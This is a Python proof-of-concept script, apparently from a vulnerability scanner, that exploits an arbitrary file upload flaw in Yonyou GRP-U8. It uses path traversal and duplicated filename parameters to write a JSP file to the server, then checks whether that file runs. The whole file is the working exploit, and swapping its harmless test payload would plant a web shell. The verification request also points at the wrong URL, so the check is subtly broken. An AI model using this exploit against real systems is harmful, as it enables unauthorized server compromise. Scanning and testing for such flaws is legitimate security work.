import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 用友GRP_u8_upload_data(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    url = urldata + 'UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=debugg.jsp&filename=1.jpg'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data",
        "Accept-Encoding": "gzip, deflate"
    }
    data = '''------WebKitFormBoundary92pUawKc
    Content-Disposition: form-data; name="myFile";filename="test.jpg"

    <% out.println("123");%>
    ------WebKitFormBoundary92pUawKc--'''
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=url, headers=headers, data=data, verify=False)
        shell_url = urldata + 'R9iPortal/debugg.jsp'
        response = requests.get(url=url, headers=headers, verify=False)
        if response.status_code == 200 and "123" in response.text:
            print(Vcolors.RED +"[+] 用友 GRP-U8 UploadFileData 任意文件上传漏洞，测试URL为: {}".format(shell_url)+Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 用友 GRP-U8 UploadFileData 任意文件上传漏洞不存在"+Vcolors.ENDC)
    except:
        logging.error("用友GRP_u8_upload_data脚本出现异常")



